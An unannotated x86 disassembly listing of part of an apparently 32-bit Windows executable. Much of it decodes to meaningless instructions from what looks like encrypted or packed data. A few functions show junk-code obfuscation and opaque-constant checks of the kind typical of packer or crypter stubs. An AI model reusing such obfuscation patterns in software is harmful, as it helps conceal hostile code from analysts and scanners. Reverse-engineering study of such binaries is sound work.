  40a001:	and    edx,DWORD PTR [ecx]
  40a003:	popa   
  40a004:	mov    eax,ds:0x614f4df2
  40a009:	push   esi
  40a00a:	daa    
  40a00b:	mov    DWORD PTR [esi],esp
  40a00d:	push   ebp
  40a00e:	push   bx
  40a010:	sar    DWORD PTR [eax],1
  40a012:	mov    esp,0x5cbf8246
  40a017:	in     eax,0x62
  40a019:	and    DWORD PTR [edi],0x2cfed3ca
  40a01f:	mov    ds:0xcc7ecb62,eax
  40a024:	jo     0x40a015
  40a026:	xchg   edi,eax
  40a027:	in     eax,dx
  40a028:	xor    BYTE PTR [di+0x442d],ah
  40a02d:	push   0xffffff8c
  40a02f:	clc    
  40a030:	mov    esi,0xbd2ae198
  40a035:	xor    ah,dh
  40a037:	mov    eax,0xe947df76
  40a03c:	aaa    
  40a03d:	sub    bh,BYTE PTR [ebp-0x4211a0dc]
  40a043:	xlat   BYTE PTR ds:[ebx]
  40a044:	push   ebx
  40a045:	mov    bl,0x14
  40a047:	fnsave [esi]
  40a049:	push   ecx
  40a04a:	fs into 
  40a04c:	pop    ds
  40a04d:	repnz test bh,dl
  40a050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a051:	mov    al,ds:0x77c85716
  40a056:	and    al,0xc9
  40a058:	sbb    dh,BYTE PTR [ebp-0x16ed074f]
  40a05e:	push   esi
  40a05f:	gs pop esp
  40a061:	cmp    DWORD PTR [ebp+eiz*2-0x513f83f],ebp
  40a068:	xor    DWORD PTR [edx+eax*2-0x1b],esi
  40a06c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a06d:	test   eax,0x31066d98
  40a072:	(bad)  
  40a073:	sti    
  40a074:	rol    DWORD PTR [ecx+0x25],0xd3
  40a078:	mov    edi,0xe7b2667d
  40a07d:	cwde   
  40a07e:	pop    ecx
  40a07f:	add    BYTE PTR [ebp-0x7a9ee839],cl
  40a085:	mov    eax,ds:0x1c2fcb9d
  40a08a:	xchg   edi,eax
  40a08b:	inc    ebx
  40a08c:	in     al,0x37
  40a08e:	ds dec ecx
  40a090:	out    dx,al
  40a091:	mov    edi,0xb1fd1ed0
  40a096:	or     ecx,DWORD PTR [esi+0x27916fc3]
  40a09c:	fs fucomip st,st(6)
  40a09f:	aaa    
  40a0a0:	push   esi
  40a0a1:	dec    esp
  40a0a2:	mov    WORD PTR [ebx+ebp*1],es
  40a0a5:	sbb    edi,DWORD PTR [esi+0x39]
  40a0a8:	inc    ebp
  40a0a9:	(bad)  
  40a0aa:	sbb    cl,BYTE PTR [ecx]
  40a0ac:	push   cs
  40a0ad:	xchg   DWORD PTR [edx+0x73a8f6b3],edx
  40a0b3:	mov    ds:0x11d05077,al
  40a0b8:	(bad)  
  40a0b9:	std    
  40a0ba:	int3   
  40a0bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0bc:	and    BYTE PTR ds:0x19b7c2dd,ah
  40a0c2:	sbb    esp,esi
  40a0c4:	and    eax,0x8e94e6e7
  40a0c9:	mov    ah,0x24
  40a0cb:	push   esi
  40a0cc:	int3   
  40a0cd:	lods   al,BYTE PTR ds:[esi]
  40a0ce:	data16 fidivr WORD PTR ds:[esi+0x8b0f0fa]
  40a0d6:	ds and eax,0xc7d37f96
  40a0dc:	sar    DWORD PTR [esi],1
  40a0de:	push   ecx
  40a0df:	mov    ecx,DWORD PTR [edx-0x3d3c0a4f]
  40a0e5:	mov    dh,0xa2
  40a0e7:	aas    
  40a0e8:	push   ebp
  40a0e9:	dec    esi
  40a0ea:	(bad)  
  40a0eb:	dec    ebp
  40a0ec:	sbb    BYTE PTR [eax],bl
  40a0ee:	and    edx,DWORD PTR [esi-0x26]
  40a0f1:	fadd   QWORD PTR [ecx-0x12]
  40a0f4:	mov    si,0x751
  40a0f8:	xchg   BYTE PTR [esi+ebp*1+0x61],dl
  40a0fc:	ror    BYTE PTR [esi],cl
  40a0fe:	sbb    edx,DWORD PTR [esi+ebp*2+0x5b62c0fb]
  40a105:	sub    eax,0xf83c5422
  40a10a:	js     0x40a126
  40a10c:	pop    esi
  40a10d:	aas    
  40a10e:	or     ah,0x29
  40a111:	pop    ebx
  40a112:	bnd ret 0x7c2
  40a116:	push   cs
  40a117:	loop   0x40a114
  40a119:	mov    esi,0x53e9403c
  40a11e:	mov    dh,0x41
  40a120:	in     eax,0x78
  40a122:	and    esi,DWORD PTR gs:[esi]
  40a125:	scas   al,BYTE PTR es:[edi]
  40a126:	mov    dh,0x49
  40a128:	rcl    DWORD PTR [edx+eax*1+0x7e],0x1
  40a12d:	jl     0x40a189
  40a12f:	xchg   edx,eax
  40a130:	fld    QWORD PTR [edi+0x52]
  40a133:	mov    BYTE PTR [ecx-0x7874ee48],bl
  40a139:	loop   0x40a0f2
  40a13b:	jne    0x40a184
  40a13d:	jbe    0x40a19a
  40a13f:	mov    ?,WORD PTR [ebx]
  40a141:	lods   eax,DWORD PTR ds:[esi]
  40a142:	(bad)  
  40a143:	outs   dx,DWORD PTR ds:[esi]
  40a144:	into   
  40a145:	xor    eax,0x6be20753
  40a14a:	push   ebx
  40a14b:	sub    ecx,DWORD PTR [eax+0x8cc73b]
  40a151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a152:	sub    eax,0x703d4468
  40a157:	test   BYTE PTR [edi+ecx*8+0x38],ch
  40a15b:	dec    ebx
  40a15c:	sbb    ebx,DWORD PTR [eax+0x1c]
  40a15f:	ret    
  40a160:	push   cs
  40a161:	xchg   esp,eax
  40a162:	sti    
  40a163:	cdq    
  40a164:	pop    eax
  40a165:	ret    0x8607
  40a168:	js     0x40a18f
  40a16a:	dec    edi
  40a16b:	dec    ebx
  40a16c:	cwde   
  40a16d:	fwait
  40a16e:	arpl   WORD PTR [ebx+0x3f1cf46],dx
  40a174:	xchg   edx,eax
  40a175:	xchg   esi,eax
  40a176:	(bad)  [esp+eax*4]
  40a179:	aad    0x62
  40a17b:	popa   
  40a17c:	add    DWORD PTR [eax],ebx
  40a17e:	xchg   edx,eax
  40a17f:	popf   
  40a180:	lods   eax,DWORD PTR ds:[esi]
  40a181:	cmp    DWORD PTR [eax+ebp*8],ebp
  40a184:	fsubr  QWORD PTR [ecx-0x3e]
  40a187:	jnp    0x40a16b
  40a189:	fmul   st(7),st
  40a18b:	scas   al,BYTE PTR es:[edi]
  40a18c:	mov    dl,0x48
  40a18e:	std    
  40a18f:	pop    ss
  40a190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a192:	call   0xbdfc:0xd5264fe9
  40a199:	mov    ch,0xbc
  40a19b:	mov    ah,0xeb
  40a19d:	lods   al,BYTE PTR ds:[esi]
  40a19e:	outs   dx,BYTE PTR ds:[esi]
  40a19f:	sub    eax,0xb2d535dc
  40a1a4:	(bad)  
  40a1a5:	nop
  40a1a6:	jbe    0x40a15e
  40a1a8:	enter  0x6b7e,0xf7
  40a1ac:	mov    ch,0x67
  40a1ae:	adc    eax,0xef9cd9e5
  40a1b3:	test   BYTE PTR [esi-0x57891fe7],al
  40a1b9:	add    ebp,DWORD PTR [ecx]
  40a1bb:	lods   al,BYTE PTR ds:[esi]
  40a1bc:	fisttp DWORD PTR [edx+0x2a]
  40a1bf:	or     eax,0x2de138a2
  40a1c4:	sbb    al,0x31
  40a1c6:	mov    edi,DWORD PTR [edx-0x55ee1d31]
  40a1cc:	stc    
  40a1cd:	jge    0x40a1d0
  40a1cf:	mov    edx,DWORD PTR [esp+ebp*8+0x72ffd2f2]
  40a1d6:	sar    DWORD PTR [ecx+0x72],1
  40a1d9:	inc    edx
  40a1da:	lea    esi,[edi-0x72100289]
  40a1e0:	inc    ebp
  40a1e1:	inc    eax
  40a1e2:	clc    
  40a1e3:	cmp    ebx,ebp
  40a1e5:	xchg   edi,eax
  40a1e6:	pop    ss
  40a1e7:	or     DWORD PTR [edx-0x130d7205],esp
  40a1ed:	icebp  
  40a1ee:	lock pop ds
  40a1f0:	push   ecx
  40a1f1:	scas   eax,DWORD PTR es:[edi]
  40a1f2:	jns    0x40a1b8
  40a1f4:	shr    BYTE PTR ds:0xd042d9b5,0x2e
  40a1fb:	sub    bh,BYTE PTR [ecx]
  40a1fd:	cmp    esi,eax
  40a1ff:	jne    0x40a21b
  40a205:	mov    eax,DWORD PTR [ebp-0x4]
  40a208:	mov    esi,DWORD PTR [ebp-0x8]
  40a20b:	xor    eax,edx
  40a20d:	xor    esi,edx
  40a20f:	add    eax,ecx
  40a211:	add    esi,ecx
  40a213:	imul   eax,esi
  40a216:	jmp    0x40a256
  40a21b:	mov    eax,DWORD PTR [ebp+0xc]
  40a21e:	mov    eax,DWORD PTR [eax+0x78]
  40a221:	mov    DWORD PTR [ebp+0xc],eax
  40a224:	mov    eax,DWORD PTR [ebp-0x4]
  40a227:	mov    esi,DWORD PTR [ebp-0x8]
  40a22a:	xor    eax,edx
  40a22c:	xor    esi,edx
  40a22e:	add    eax,ecx
  40a230:	add    esi,ecx
  40a232:	imul   eax,esi
  40a235:	mov    esi,DWORD PTR [ebp+0xc]
  40a238:	cmp    esi,eax
  40a23a:	mov    eax,DWORD PTR [ebp-0x4]
  40a23d:	je     0x40a208
  40a243:	xor    eax,edx
  40a245:	add    eax,ecx
  40a247:	mov    ecx,DWORD PTR [ebp+0xc]
  40a24a:	imul   eax,ecx
  40a24d:	add    eax,DWORD PTR [ebp+0x8]
  40a250:	mov    DWORD PTR [ebp+0xc],eax
  40a253:	mov    eax,DWORD PTR [ebp+0xc]
  40a256:	pop    esi
  40a257:	leave  
  40a258:	ret    0x8
  40a25b:	push   ebp
  40a25c:	mov    ebp,esp
  40a25e:	sub    esp,0x10
  40a261:	sbb    eax,DWORD PTR ds:0x413c88
  40a267:	mov    eax,0xf89c85b0
  40a26c:	xor    edx,edx
  40a26e:	xor    edx,DWORD PTR ds:0x414014
  40a274:	sub    DWORD PTR ds:0x413cf4,edx
  40a27a:	mov    DWORD PTR [ebp-0x4],eax
  40a27d:	add    ecx,ecx
  40a27f:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40a286:	or     DWORD PTR ds:0x414014,edi
  40a28c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a28f:	push   esi
  40a290:	mov    edx,0x7510894
  40a295:	add    esi,0x25d7
  40a29b:	xor    ecx,edx
  40a29d:	mov    DWORD PTR ds:0x413d30,0x18
  40a2a7:	cmp    DWORD PTR ds:0x413d30,0x0
  40a2ae:	je     0x40a2e4
  40a2b4:	cmp    DWORD PTR ds:0x413d30,0x19
  40a2bb:	jne    0x40a2cc
  40a2c1:	push   0x413ce8
  40a2c6:	call   DWORD PTR ds:0x41679c
  40a2cc:	mov    esi,DWORD PTR ds:0x413d30
  40a2d2:	dec    esi
  40a2d3:	mov    DWORD PTR ds:0x413d30,esi
  40a2d9:	jmp    0x40a2a7
  40a2de:	add    esi,DWORD PTR ds:0x413d24
  40a2e4:	mov    esi,0x3272dc
  40a2e9:	neg    DWORD PTR ds:0x413d24
  40a2ef:	push   edi
  40a2f0:	mov    edi,DWORD PTR [ebp+0x10]
  40a2f3:	adc    DWORD PTR ds:0x414008,0x741e
  40a2fd:	add    ecx,esi
  40a2ff:	cmp    ecx,edi
  40a301:	mov    DWORD PTR ds:0x413c80,0x1b1e
  40a30b:	je     0x40a474
  40a311:	mov    ecx,DWORD PTR [ebp-0x4]
  40a314:	mov    edi,DWORD PTR [ebp+0x10]
  40a317:	xor    eax,eax
  40a319:	xor    ecx,edx
  40a31b:	adc    DWORD PTR ds:0x413d2c,0x414008
  40a325:	add    ecx,esi
  40a327:	add    edi,0xfabdbeef
  40a32d:	adc    eax,0xffffffff
  40a330:	neg    DWORD PTR ds:0x413c88
  40a336:	xor    eax,0x0
  40a339:	mov    DWORD PTR [ebp-0xc],eax
  40a33c:	push   ebx
  40a33d:	movzx  eax,BYTE PTR ds:0x413d30
  40a344:	adc    DWORD PTR ds:0x414018,eax
  40a34a:	xor    ebx,ebx
  40a34c:	xor    edi,0x8a29a125
  40a352:	mov    eax,ds:0x413c12
  40a357:	and    DWORD PTR ds:0x413cdc,eax
  40a35d:	mov    eax,ecx
  40a35f:	add    eax,0xfabdbeef
  40a364:	mov    DWORD PTR ds:0x413c6c,0x7b3
  40a36e:	adc    ebx,0xffffffff
  40a371:	add    DWORD PTR ds:0x413c88,0x414018
  40a37b:	xor    eax,0x8a29a125
  40a380:	mov    DWORD PTR ds:0x413d18,0x6932
  40a38a:	xor    ebx,0x0
  40a38d:	mov    DWORD PTR ds:0x413cd8,0x53fd
  40a397:	cmp    eax,edi
  40a399:	mov    DWORD PTR ds:0x413c88,0x1215
  40a3a3:	jne    0x40a3c6
  40a3a9:	mov    DWORD PTR ds:0x413c16,0x2565
  40a3b3:	cmp    ebx,DWORD PTR [ebp-0xc]
  40a3b6:	je     0x40a46e
  40a3bc:	jmp    0x40a3c6
  40a3c1:	mov    esi,0x3272dc
  40a3c6:	and    DWORD PTR ds:0x413d30,0x0
  40a3d0:	xor    eax,eax
  40a3d2:	xor    eax,DWORD PTR ds:0x413d30
  40a3d8:	inc    eax
  40a3d9:	mov    ds:0x413d30,eax
  40a3de:	cmp    DWORD PTR ds:0x413d30,0x26
  40a3e5:	jne    0x40a3f9
  40a3eb:	push   0x413d20
  40a3f0:	push   DWORD PTR [ebp-0x10]
  40a3f3:	call   DWORD PTR ds:0x41675c
  40a3f9:	cmp    DWORD PTR ds:0x413d30,0x1f
  40a400:	jb     0x40a3d0
  40a406:	mov    eax,DWORD PTR [ebp-0x4]
  40a409:	mov    edi,DWORD PTR [ebp-0x8]
  40a40c:	xor    edi,edx
  40a40e:	add    edi,esi
  40a410:	mov    esi,DWORD PTR [ebp+0x8]
  40a413:	imul   edi,ecx
  40a416:	mov    ebx,DWORD PTR [ebp+0xc]
  40a419:	xor    eax,edx
  40a41b:	add    eax,ecx
  40a41d:	mov    al,BYTE PTR [ebx+eax*1+0x3272dc]
  40a424:	mov    BYTE PTR [edi+esi*1],al
  40a427:	mov    eax,DWORD PTR [ebp-0x8]
  40a42a:	mov    esi,DWORD PTR [ebp+0x10]
  40a42d:	xor    eax,edx
  40a42f:	xor    ebx,ebx
  40a431:	add    esi,0xfabdbeef
  40a437:	adc    ebx,0xffffffff
  40a43a:	lea    ecx,[ecx+eax*1+0x3272dc]
  40a441:	xor    edi,edi
  40a443:	xor    esi,0x8a29a125
  40a449:	xor    ebx,0x0
  40a44c:	mov    eax,ecx
  40a44e:	add    eax,0xfabdbeef
  40a453:	adc    edi,0xffffffff
  40a456:	xor    eax,0x8a29a125
  40a45b:	xor    edi,0x0
  40a45e:	cmp    eax,esi
  40a460:	jne    0x40a3c1
  40a466:	cmp    edi,ebx
  40a468:	jne    0x40a3c1
  40a46e:	mov    eax,0xf89c85b1
  40a473:	pop    ebx
  40a474:	pop    edi
  40a475:	pop    esi
  40a476:	leave  
  40a477:	ret    0xc
  40a47a:	push   ebp
  40a47b:	mov    ebp,esp
  40a47d:	sub    esp,0xa4
  40a483:	sbb    DWORD PTR ds:0x413cf4,0x6aac
  40a48d:	mov    ecx,DWORD PTR [ebp+0x8]
  40a490:	and    DWORD PTR ds:0x414008,0x0
  40a49a:	mov    eax,ds:0x414008
  40a49f:	inc    eax
  40a4a0:	mov    ds:0x414008,eax
  40a4a5:	cmp    DWORD PTR ds:0x414008,0x6
  40a4ac:	jne    0x40a4c5
  40a4b2:	push   DWORD PTR [ebp-0x18]
  40a4b5:	push   0x41401c
  40a4ba:	push   0x1f9d
  40a4bf:	call   DWORD PTR ds:0x416760
  40a4c5:	cmp    DWORD PTR ds:0x414008,0x5
  40a4cc:	jne    0x40a4dd
  40a4d2:	mov    eax,ds:0x414008
  40a4d7:	inc    eax
  40a4d8:	mov    ds:0x414008,eax
  40a4dd:	cmp    DWORD PTR ds:0x414008,0x1b
  40a4e4:	jb     0x40a49a
  40a4ea:	mov    DWORD PTR ds:0x41401c,0x17
  40a4f4:	cmp    DWORD PTR ds:0x41401c,0x0
  40a4fb:	je     0x40a54c
  40a501:	cmp    DWORD PTR ds:0x41401c,0x6
  40a508:	jne    0x40a524
  40a50e:	push   DWORD PTR [ebp-0x24]
  40a511:	push   0x3b56
  40a516:	push   DWORD PTR [ebp-0x1c]
  40a519:	push   0x73b3
  40a51e:	call   DWORD PTR ds:0x416764
  40a524:	cmp    DWORD PTR ds:0x41401c,0x7
  40a52b:	jne    0x40a53c
  40a531:	mov    eax,ds:0x41401c
  40a536:	dec    eax
  40a537:	mov    ds:0x41401c,eax
  40a53c:	mov    eax,ds:0x41401c
  40a541:	dec    eax
  40a542:	mov    ds:0x41401c,eax
  40a547:	jmp    0x40a4f4
  40a54c:	mov    eax,0x8a87
  40a551:	xor    ax,WORD PTR [ecx+0x20]
  40a555:	not    DWORD PTR ds:0x413cf4
  40a55b:	mov    ecx,0x3b4a
  40a560:	adc    DWORD PTR ds:0x413c0a,0x414008
  40a56a:	add    ax,cx
  40a56d:	movzx  eax,ax
  40a570:	mov    DWORD PTR [ebp-0x18],eax
  40a573:	mov    ecx,DWORD PTR ds:0x413c78
  40a579:	sbb    DWORD PTR ds:0x413d28,ecx
  40a57f:	mov    BYTE PTR [ebp-0x1],0x7d
  40a583:	add    ecx,DWORD PTR ds:0x414000
  40a589:	lea    eax,[ebp-0x1]
  40a58c:	xor    DWORD PTR ds:0x413c78,ecx
  40a592:	mov    DWORD PTR [ebp-0x10],eax
  40a595:	add    DWORD PTR ds:0x413d1c,0x4151
  40a59f:	mov    al,BYTE PTR [ebp-0x1]
  40a5a2:	mov    ecx,DWORD PTR [ebp-0x10]
  40a5a5:	or     DWORD PTR ds:0x413d20,0x66e0
  40a5af:	xor    al,0x70
  40a5b1:	and    DWORD PTR ds:0x414000,0x34d9
  40a5bb:	sub    al,0xc
  40a5bd:	and    DWORD PTR ds:0x413d1c,0x413c70
  40a5c7:	mov    BYTE PTR [ecx],al
  40a5c9:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  40a5d0:	or     DWORD PTR ds:0x413ce0,ecx
  40a5d6:	push   ebx
  40a5d7:	jmp    0x40c95f
  40a5dc:	and    ch,BYTE PTR ds:0xb393b193
  40a5e2:	add    cl,BYTE PTR [edi-0x6bf6fe89]
  40a5e8:	aaa    
  40a5e9:	aad    0xbf
  40a5eb:	mov    fs,WORD PTR [edi]
  40a5ed:	push   es
  40a5ee:	jl     0x40a66c
  40a5f0:	pop    es
  40a5f1:	pop    edi
  40a5f2:	jl     0x40a670
  40a5f4:	mov    eax,ds:0xdac1aeb8
  40a5f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5fa:	outs   dx,BYTE PTR ds:[esi]
  40a5fb:	dec    edi
  40a5fc:	test   DWORD PTR [ebx+0x72],edi
  40a5ff:	outs   dx,DWORD PTR ds:[esi]
  40a600:	inc    edx
  40a601:	hlt    
  40a602:	loope  0x40a664
  40a604:	pop    ss
  40a605:	cmc    
  40a606:	dec    eax
  40a607:	aaa    
  40a608:	std    
  40a609:	sar    DWORD PTR [ecx+0x417c5d4a],0xc6
  40a610:	outs   dx,DWORD PTR ds:[esi]
  40a611:	inc    edi
  40a612:	ret    0xfe2b
  40a615:	sbb    DWORD PTR [ecx],esp
  40a617:	mov    ecx,0x8ad28aa4
  40a61c:	xor    BYTE PTR [edx-0x44],cl
  40a61f:	(bad)  
  40a621:	nop
  40a622:	popa   
  40a623:	cmp    dh,BYTE PTR [edx+0x10bd25b4]
  40a629:	adc    dl,ch
  40a62b:	push   ebx
  40a62c:	mov    ah,BYTE PTR [ebx-0x37]
  40a62f:	inc    edx
  40a630:	add    al,0xf7
  40a632:	in     al,0x60
  40a634:	jg     0x40a654
  40a636:	adc    DWORD PTR [esi-0x7d],edi
  40a639:	push   0x4a404020
  40a63e:	fdivr  DWORD PTR [edi]
  40a640:	pop    ebx
  40a641:	add    DWORD PTR [edx-0x25],edx
  40a644:	adc    al,0x62
  40a646:	popf   
  40a647:	push   edi
  40a648:	(bad)  
  40a649:	or     eax,DWORD PTR [ebp-0x2a]
  40a64c:	call   0x5dd:0x7dd047d7
  40a653:	leave  
  40a654:	adc    BYTE PTR cs:[esi],ch
  40a657:	push   cs
  40a658:	sti    
  40a659:	bound  esi,QWORD PTR [esi+0x5043dab9]
  40a65f:	aas    
  40a660:	and    eax,0x1d20b90d
  40a665:	mov    dh,0x84
  40a667:	fwait
  40a668:	arpl   WORD PTR [eax-0x287da787],bx
  40a66e:	cld    
  40a66f:	mov    eax,0x32a95333
  40a674:	jnp    0x40a659
  40a676:	push   0x20
  40a678:	int3   
  40a679:	out    0x97,al
  40a67b:	mov    ch,0x59
  40a67d:	adc    eax,0x47148dec
  40a682:	add    ebp,DWORD PTR [edi]
  40a684:	aad    0xfb
  40a686:	popa   
  40a687:	shl    DWORD PTR [edx],1
  40a689:	cmp    BYTE PTR [edi+0x36],ch
  40a68c:	pop    ecx
  40a68d:	xchg   ecx,eax
  40a68e:	push   es
  40a68f:	mov    eax,0xca7490f2
  40a694:	ret    
  40a695:	sbb    al,0x12
  40a697:	ret    0x943c
  40a69a:	push   ebx
  40a69b:	cwde   
  40a69c:	sub    esi,DWORD PTR [ebx+0x3]
  40a69f:	or     al,0x95
  40a6a1:	ret    
  40a6a2:	jmp    0x8d28:0xf2832073
  40a6a9:	rol    DWORD PTR [ebx+0x3f],0x52
  40a6ad:	sar    DWORD PTR [esp+ebp*8],1
  40a6b0:	xchg   ecx,eax
  40a6b1:	xchg   DWORD PTR [ebx+0x5d65cb82],edx
  40a6b7:	sbb    ecx,DWORD PTR [esi]
  40a6b9:	pop    es
  40a6ba:	pop    ds
  40a6bb:	inc    ecx
  40a6bc:	add    DWORD PTR [esi+edi*2-0x10],0xffffff89
  40a6c1:	ror    cl,1
  40a6c3:	pop    ebp
  40a6c4:	repnz lahf 
  40a6c6:	repz inc eax
  40a6c8:	push   ebx
  40a6c9:	mov    BYTE PTR [edx],ah
  40a6cb:	loopne 0x40a684
  40a6cd:	fwait
  40a6ce:	shl    BYTE PTR [eax],0xce
  40a6d1:	aad    0x91
  40a6d3:	arpl   WORD PTR [edx+0x444518f7],si
  40a6d9:	mov    bh,0xbb
  40a6db:	jne    0x40a696
  40a6dd:	mov    ecx,ebp
  40a6df:	dec    DWORD PTR [edi+0x30ee712]
  40a6e5:	retf   
  40a6e6:	cdq    
  40a6e7:	add    bh,BYTE PTR [ebx]
  40a6e9:	mov    al,0x58
  40a6eb:	mov    BYTE PTR [ecx+0x5880df8d],0xa3
  40a6f2:	icebp  
  40a6f3:	jb     0x40a759
  40a6f5:	lds    edx,FWORD PTR [ebp-0x6a]
  40a6f8:	dec    edx
  40a6f9:	retf   
  40a6fa:	or     ecx,DWORD PTR [esi-0x41]
  40a6fd:	xor    esi,DWORD PTR [esi-0x22559258]
  40a703:	ret    
  40a704:	cmp    al,bl
  40a706:	add    al,0xa3
  40a708:	push   ds
  40a709:	pop    ecx
  40a70a:	inc    ecx
  40a70b:	pushf  
  40a70c:	cmp    al,cl
  40a70e:	fisubr DWORD PTR ss:[edi-0x2611e6fd]
  40a715:	(bad)  [edi+ecx*1-0x32d5d17f]
  40a71c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a71d:	imul   ebp,DWORD PTR [ecx+eiz*1-0x27],0x9fe4b7d4
  40a725:	xor    al,0x4d
  40a727:	test   esi,esi
  40a729:	sbb    dl,BYTE PTR [eax+0x3c13a13f]
  40a72f:	outs   dx,BYTE PTR ds:[esi]
  40a730:	pop    esp
  40a731:	and    DWORD PTR [edi+0x38d6cae],ebp
  40a737:	sub    cl,BYTE PTR [edx+esi*2-0x7]
  40a73b:	xlat   BYTE PTR ds:[ebx]
  40a73c:	(bad)  
  40a73e:	inc    ebp
  40a73f:	push   es
  40a740:	cwde   
  40a741:	fadd   QWORD PTR [ebx]
  40a743:	push   edx
  40a744:	push   cs
  40a745:	inc    eax
  40a746:	std    
  40a747:	mov    ds:0x5a5e89c3,eax
  40a74c:	fcom   QWORD PTR [eax+0xff7027f]
  40a752:	adc    cl,BYTE PTR [ebp-0x75]
  40a755:	imul   ebx,ebp,0xffffff92
  40a758:	xchg   ebp,eax
  40a759:	mov    dl,0xd3
  40a75b:	out    dx,eax
  40a75c:	sbb    DWORD PTR [edx+0x29b01371],ebx
  40a762:	loopne 0x40a74d
  40a764:	call   0x93ee30dd
  40a769:	js     0x40a778
  40a76b:	cmp    bh,0x3f
  40a76e:	cmp    BYTE PTR gs:[edx-0x14],dh
  40a772:	cld    
  40a773:	dec    esi
  40a774:	push   esp
  40a775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a776:	bound  edi,QWORD PTR [ecx+0x4a5baddb]
  40a77c:	ret    0x698a
  40a77f:	iret   
  40a780:	adc    ch,BYTE PTR [ecx-0x676ba011]
  40a786:	mov    edx,DWORD PTR [esi-0x21]
  40a789:	xor    al,0x3d
  40a78b:	loopne 0x40a7a3
  40a78d:	mov    dl,0x49
  40a78f:	ds inc ebp
  40a791:	and    BYTE PTR [ecx+0x61e8f2a9],bh
  40a797:	fbstp  TBYTE PTR [edx-0x3ebc7767]
  40a79d:	ret    0xe45b
  40a7a0:	mov    ds:0x1e1f90f7,eax
  40a7a5:	fsubrp st(1),st
  40a7a7:	in     eax,0x47
  40a7a9:	jbe    0x40a795
  40a7ab:	call   0x605b124f
  40a7b0:	inc    esi
  40a7b1:	scas   al,BYTE PTR es:[edi]
  40a7b2:	cld    
  40a7b3:	pop    esi
  40a7b4:	clc    
  40a7b5:	lea    ecx,[edx-0x35]
  40a7b8:	fsubr  QWORD PTR [edi-0x47]
  40a7bb:	and    bl,BYTE PTR [esi+0x38696244]
  40a7c1:	ins    DWORD PTR es:[edi],dx
  40a7c2:	push   ebp
  40a7c3:	xchg   BYTE PTR [ebx-0x4558f755],ch
  40a7c9:	xchg   BYTE PTR [ebp+eiz*2+0x2c44a6ef],cl
  40a7d0:	cmc    
  40a7d1:	push   ebx
  40a7d2:	jnp    0x40a7d4
  40a7d4:	sbb    edx,DWORD PTR [ebx+0x49]
  40a7d7:	(bad)  
  40a7d8:	in     al,dx
  40a7d9:	mov    esi,0x64e1aab3
  40a7de:	pop    ebx
  40a7df:	int    0x58
  40a7e1:	adc    al,0xba
  40a7e3:	dec    ebp
  40a7e4:	int3   
  40a7e5:	cmc    
  40a7e6:	pushf  
  40a7e7:	or     BYTE PTR [esi-0x58741bf0],dh
  40a7ed:	scas   eax,DWORD PTR es:[edi]
  40a7ee:	imul   DWORD PTR [esi+0x66]
  40a7f1:	fwait
  40a7f2:	and    BYTE PTR [edi+esi*2+0x67],bl
  40a7f6:	push   ebp
  40a7f7:	mul    BYTE PTR [edx+0x78]
  40a7fa:	mov    eax,0xeb788dd6
  40a7ff:	rcr    ah,cl
  40a801:	aad    0x60
  40a803:	cli    
  40a804:	fstp   DWORD PTR ds:0x66cfa9a9
  40a80a:	mov    dh,BYTE PTR [edx]
  40a80c:	xor    DWORD PTR [ebp+0x23],0x27e69890
  40a813:	int3   
  40a814:	inc    esp
  40a815:	or     eax,0x860dd2ac
  40a81a:	xchg   esi,eax
  40a81b:	inc    esi
  40a81c:	ret    
  40a81d:	cmp    edi,edx
  40a81f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a820:	call   0x2050415b
  40a825:	jp     0x40a80f
  40a827:	jmp    FWORD PTR [ebp-0x5a]
  40a82a:	push   ebx
  40a82b:	adc    eax,0x3460597b
  40a830:	dec    edi
  40a831:	dec    esp
  40a832:	in     al,dx
  40a833:	xor    esi,0x6dbb3d86
  40a839:	fild   WORD PTR [eax]
  40a83b:	pop    ebx
  40a83c:	sbb    al,0xd
  40a83e:	ins    DWORD PTR es:[edi],dx
  40a83f:	dec    esp
  40a840:	add    dh,BYTE PTR [ebx-0x7b]
  40a843:	xor    al,0xb6
  40a845:	push   ebp
  40a846:	pop    ebx
  40a847:	mov    cs:0xe64f2719,al
  40a84d:	out    dx,eax
  40a84e:	in     eax,dx
  40a84f:	scas   al,BYTE PTR es:[edi]
  40a850:	mov    dl,dh
  40a852:	shl    BYTE PTR [ecx+esi*4-0x12],cl
  40a856:	xchg   ebp,eax
  40a857:	and    al,0x9c
  40a859:	sub    ebp,edx
  40a85b:	sub    ebx,DWORD PTR [esi+0x47c0d478]
  40a861:	dec    ebp
  40a862:	jmp    0x5b72:0x588ac0d3
  40a869:	(bad)  
  40a86a:	jbe    0x40a873
  40a86c:	cli    
  40a86d:	arpl   WORD PTR [edi+0x3272d188],bp
  40a873:	mov    ebp,0xf92655d
  40a878:	jb     0x40a85a
  40a87a:	imul   edx,DWORD PTR [ebx+0x63cf2d43],0x8673cc6f
  40a884:	retf   0x7740
  40a887:	aas    
  40a888:	push   ecx
  40a889:	mov    ebp,0xa3c47eb
  40a88e:	cmp    dh,ch
  40a890:	cmp    al,BYTE PTR [edi]
  40a892:	add    edi,DWORD PTR [edi+0x1d]
  40a895:	sub    eax,0xfed34374
  40a89a:	aas    
  40a89b:	pop    eax
  40a89c:	stos   DWORD PTR es:[edi],eax
  40a89d:	inc    ecx
  40a89e:	mov    ecx,0xdb22c25c
  40a8a3:	hlt    
  40a8a4:	adc    al,0x91
  40a8a6:	ins    BYTE PTR es:[edi],dx
  40a8a7:	sbb    eax,ebp
  40a8a9:	and    esp,ebp
  40a8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8ac:	dec    edi
  40a8ad:	(bad)  
  40a8af:	fist   WORD PTR [ebx]
  40a8b1:	sub    eax,0xc8d2050d
  40a8b6:	push   ebx
  40a8b7:	push   0x25
  40a8b9:	inc    ecx
  40a8ba:	fbstp  TBYTE PTR [esi]
